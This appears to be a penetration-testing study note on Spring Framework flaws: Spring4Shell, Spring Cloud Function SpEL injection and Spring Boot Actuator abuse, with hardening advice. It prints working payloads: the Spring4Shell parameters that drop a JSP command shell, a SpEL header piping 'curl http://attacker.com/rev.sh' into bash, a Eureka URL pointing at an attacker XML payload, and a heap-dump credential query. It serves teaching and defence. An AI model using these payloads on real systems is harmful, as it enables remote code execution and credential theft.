---
tags: [web, advanced, enterprise, deserialization, vapt]
difficulty: advanced
module: "80 - Enterprise Web Apps: WebLogic, ColdFusion, Liferay"
topic: "80.09 Spring Framework Vulnerabilities Spring4Shell"
---

# Spring Framework Vulnerabilities & Spring4Shell

## 1. Introduction to the Spring Ecosystem

The Spring Framework is arguably the most dominant application framework in the Java ecosystem. It provides comprehensive infrastructure support for developing Java applications, handling everything from dependency injection and data binding to web routing (Spring MVC) and microservices architecture (Spring Boot/Cloud). 

Because of its massive adoption in enterprise environments, vulnerabilities within the Spring ecosystem have catastrophic, wide-reaching implications. The complexity of features like implicit data binding, dynamic expression evaluation (SpEL), and auto-configuration often leads to subtle but devastating vulnerabilities. 

### 1.1 The Attack Surface
The primary attack vectors in Spring applications include:
- **Data Binding Flaws:** Manipulating object properties implicitly through HTTP parameters.
- **Spring Expression Language (SpEL) Injection:** Unsafe evaluation of dynamic expressions.
- **Actuator Endpoints:** Misconfigured management interfaces leaking sensitive data or allowing environmental manipulation.
- **Deserialization:** Unsafe handling of Java objects in Spring AMQP, Spring Kafka, or Spring Remoting.

## 2. Architectural Overview and Attack Flow Diagram

To understand data binding vulnerabilities like Spring4Shell, one must understand how Spring's `DataBinder` automatically populates Java objects based on HTTP request parameters.

```ascii
+-------------------------------------------------------------+
|               Spring MVC Data Binding & Spring4Shell        |
+-------------------------------------------------------------+
|                                                             |
| [ Attacker ]                                                |
|      |                                                      |
|      | 1. HTTP POST Request with crafted parameters:        |
|      |    class.module.classLoader.resources.context        |
|      |    .parent.pipeline.first.pattern = %{c2}i           |
|      v                                                      |
| [ Tomcat Web Server ]                                       |
|      |                                                      |
|      v                                                      |
| [ Spring DispatcherServlet ]                                |
|      |                                                      |
|      | 2. Routes request to appropriate Controller          |
|      v                                                      |
| [ Spring DataBinder ]                                       |
|      |                                                      |
|      | 3. Uses Reflection to map HTTP params to POJO        |
|      |    - Accesses User.getClass()                        |
|      |    - Navigates to Tomcat's WebappClassLoaderBase     |
|      |    - Modifies Tomcat AccessLogValve properties       |
|      v                                                      |
| [ Tomcat AccessLogValve Configuration Modified! ]           |
|      |                                                      |
|      | 4. Tomcat writes subsequent logs as .jsp files       |
|      |    containing the attacker's web shell payload.      |
|      v                                                      |
| [ Web Shell Dropped ] -> /ROOT/shell.jsp                    |
|                                                             |
+-------------------------------------------------------------+
```

## 3. Deep Dive: Spring4Shell (CVE-2022-22965)

Spring4Shell is a critical Remote Code Execution vulnerability in the Spring Framework's core data binding mechanism. It allows unauthenticated attackers to execute arbitrary code on the host system. It drew immediate comparisons to Log4Shell due to its severity and widespread impact.

### 3.1 The Vulnerability Mechanism
Spring MVC allows developers to bind HTTP request parameters directly to a plain old Java object (POJO). For example, a request with `name=Alice&age=30` will automatically map to the `setName()` and `setAge()` methods of the target object.

The vulnerability arises because the DataBinder recursively inspects the object graph. Crucially, every Java object inherits the `getClass()` method. In Java 9 and later, the introduction of the Module System added a `getModule()` method to `Class`. 

An attacker can exploit this by passing parameters that traverse the object graph:
`class.module.classLoader...`

If the application is deployed as a WAR file within Apache Tomcat, the `classLoader` resolves to Tomcat's `WebappClassLoaderBase`. From there, the attacker can navigate to the `resources.context.parent.pipeline.first` property, which points to the `AccessLogValve`.

### 3.2 Exploitation Mechanics
The goal of the exploit is to modify the properties of Tomcat's `AccessLogValve` to change where and how access logs are written, effectively turning the access log into a JSP web shell.

**Exploitation Steps:**
1. Identify an endpoint that binds request parameters to a POJO (e.g., a form submission endpoint).
2. Send a request containing the following malicious parameters:
   - `class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT` (Set output directory)
   - `class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell` (Set file name prefix)
   - `class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp` (Set file extension)
   - `class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{c2}i if("j".equals(request.getParameter("pwd"))){ java.io.InputStream in = %{c1}i.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } } %{suffix}i` (Set the log format to a JSP web shell, using HTTP headers to inject the payload to bypass WAFs).
   - `class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=` (Remove the date format so the filename is exact).
3. The DataBinder modifies the Tomcat valve configuration.
4. The attacker sends a subsequent request to trigger a log entry, providing the payload via the `c1` and `c2` headers. Tomcat writes this log entry as `shell.jsp` in the ROOT directory.
5. The attacker navigates to `/shell.jsp?pwd=j&cmd=whoami` to execute commands.

## 4. Spring Cloud Function SpEL Injection (CVE-2022-22963)

Spring Expression Language (SpEL) is a powerful expression language that supports querying and manipulating an object graph at runtime. When user input is evaluated as SpEL, it leads to RCE.

**The Vulnerability Mechanism:**
In Spring Cloud Function, a routing feature allowed developers to use a special HTTP header, `spring.cloud.function.routing-expression`, to dynamically route requests based on a SpEL expression. The framework unsafely evaluated the contents of this header.

**Exploitation Steps:**
1. Send a POST request to a Spring Cloud Function endpoint.
2. Inject a malicious SpEL payload into the header:
   ```http
   POST /functionRouter HTTP/1.1
   Host: target.local
   spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("curl http://attacker.com/rev.sh | bash")
   Content-Type: text/plain

   Data
   ```
3. The framework evaluates the `T(java.lang.Runtime)` expression, achieving immediate code execution.

## 5. Exploiting Spring Boot Actuators

Spring Boot Actuators provide built-in endpoints for monitoring and managing applications (e.g., health, metrics, environment variables). In Spring Boot 1.x, these were often unauthenticated by default. In 2.x+, they are more secure, but misconfigurations are rampant.

### 5.1 Environmental Manipulation via `/env`
The `/env` endpoint allows reading and, critically, *writing* environment properties. 

**Exploitation (Spring Boot 1.x / Eureka RCE):**
An attacker can send a POST request to `/env` to inject malicious properties. If the application uses Spring Cloud Netflix Eureka, the attacker can overwrite the `eureka.client.serviceUrl.defaultZone` property.
1. Set the property to point to an attacker-controlled XML file: `eureka.client.serviceUrl.defaultZone=http://attacker.com/payload.xml`
2. Trigger a refresh by calling the `/refresh` endpoint.
3. The server fetches the XML file, which can contain an XStream deserialization payload, leading to RCE.

### 5.2 Heap Dumps and Credential Theft
The `/heapdump` endpoint generates a full JVM heap dump. Attackers can download this massive file (`.hprof`) and use tools like Eclipse MAT or `jhat` to parse it.

The heap dump contains the memory state of the application, meaning all plaintext passwords, API keys, database credentials, and session tokens that were in memory at the time of the dump can be extracted.

## 6. Defensive Strategies and Hardening

1. **Patching and JDK Updates:** Update Spring Framework to safe versions (e.g., 5.3.18+ or 5.2.20+ for Spring4Shell). Running on JDK 8 prevents Spring4Shell entirely, as the module system was introduced in JDK 9.
2. **Restrict Actuator Endpoints:** Never expose Actuator endpoints to the public internet. Require strong authentication (e.g., Spring Security) and only enable the specific endpoints needed (`management.endpoints.web.exposure.include=health,info`).
3. **Disallow Specific Data Binding Fields:** Developers can use `@InitBinder` to strictly control which fields are allowed to be bound, explicitly blacklisting `class.*`, `Class.*`, `*.class.*`, and `*.Class.*`.
4. **Avoid SpEL on User Input:** Never use user-supplied data to construct SpEL expressions. If dynamic logic is needed, use static mapping or heavily sanitized input.

## 7. Chaining Opportunities
- **Actuator Heapdump to Database Compromise:** Download the `/heapdump` from an exposed Spring Actuator, use Eclipse MAT with OQL (`select s.value.toString() from java.lang.String s where s.value.toString().contains("jdbc:mysql")`) to extract the database password, and use it to connect directly to the internal database.
- **Spring4Shell to Lateral Movement:** Exploit Spring4Shell on a public-facing Tomcat server to drop a web shell. Use the web shell to access the internal network, discovering internally hosted microservices running vulnerable Spring Cloud Function instances (CVE-2022-22963).
- **Env Modification to SSRF:** Modify the `spring.cloud.gateway.routes` configuration via the `/env` actuator to create a malicious route that proxies traffic to internal cloud infrastructure (e.g., AWS Metadata IP), effectively creating an SSRF tunnel.

## 8. Related Notes
- [[08 - Advanced Java Server Faces JSF Exploitation]]
- [[10 - Exploiting JBoss and WildFly Application Servers]]
- [[11 - Java Expression Language EL Exploitation]]
- [[05 - Java Deserialization Attacks and Gadget Chains]]
- [[13 - Attacking Continuous Integration CI Pipelines]]
